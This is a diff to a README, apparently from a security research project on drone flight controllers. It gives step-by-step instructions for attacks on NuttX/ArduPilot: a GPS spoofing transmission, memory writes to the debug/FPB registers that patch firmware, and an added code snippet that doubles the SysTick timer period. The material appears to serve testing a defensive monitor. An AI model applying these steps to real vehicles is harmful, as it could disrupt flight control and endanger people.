@@ -34,6 +34,8 @@ hackrf_transfer -t gpssim.bin -f 1575420000 -s 2600000 -a 1 -x 0
 ### Prerequisite
 1) Your main system-on-Chip must be equipped with a FPB unit. We used <a href="https://www.st.com/en/microcontrollers-microprocessors/stm32f427-437.html" target="_blank">STM32F427</a>.
 
+2) RTOS can execute shell commands (e.g., mw and mh).
+
 ### How to execute it?
 1) Connect NSH (NuttShell) on a command window
 ```bash
@@ -47,3 +49,22 @@ mh 0x20000014=0xe7fe 1
 mw 0xE0002000=0x1 1
 mw 0xE000201C=0x0807efb9 1
 ```
+
+## Timer attack
+### Prerequisite
+1) You need to know a value of the SysTick register (STK_LOAD). You can probably find such a register address on dataseet or source code of the RTOS (NuttX).
+
+### How to conduct the attack?
+1) Insert the code snippet in the below to a control loop (e.g., Copter::one_hz_loop() in ArduPilot)
+```bash
+// 0xE000E014: STK_LOAD’s register address
+volatile unsigned int *Timer_attack = (volatile unsigned int *) 0xE000E014;
+
+// Increasing the value to 2X of the original value (0x2903F) set by the RTOS
+*Timer_attack = 335998;
+```
+
+2) You can confirm the effect of the timer attack after booting.
+<img src="https://github.com/purseclab/M2MON/tree/main/attacks/timer_attack/result.png">
+
+
